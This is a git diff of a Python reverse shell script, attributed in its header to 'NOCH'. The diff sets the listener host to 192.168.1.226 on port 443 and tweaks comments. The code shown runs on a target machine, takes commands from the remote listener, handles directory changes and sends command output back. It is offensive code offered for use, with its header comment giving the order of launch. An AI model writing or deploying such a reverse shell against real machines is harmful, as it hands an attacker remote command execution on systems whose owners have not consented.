@@ -1,15 +1,14 @@
 #!/usr/bin/env python3
 
 # Reverse Shell Written by NOCH in Python3 #
-
-# Run this script on a target machine after starting the server listener #
-# Change SERVER_HOST / SERVER_PORT accordingly #
+# Run this script on the target machine after starting the server listener #
 
 import socket
 import subprocess
 import os
 
-SERVER_HOST = "x.x.x.x" # CHANGE ME TO YOUR IP
+# Initialisation of server IP, port and buffer size
+SERVER_HOST = "192.168.1.226" # CHANGE ME
 SERVER_PORT = 443 # CHANGE ME
 BUFFER_SIZE = 4096 # Send 4KB at a time
 
@@ -30,7 +29,7 @@ while True:
     # Break if command is "exit"
     if uppercmd == "EXIT":
         break
-    # Catch directory change and process through os.chdir
+    # Catch directory change cmd and process through os.chdir
     elif uppercmd[0:2] == "CD":
         path = cmd[3:]
         os.chdir(path)
@@ -44,4 +43,3 @@ while True:
         server.send(result.encode())
 
 server.close()
-    
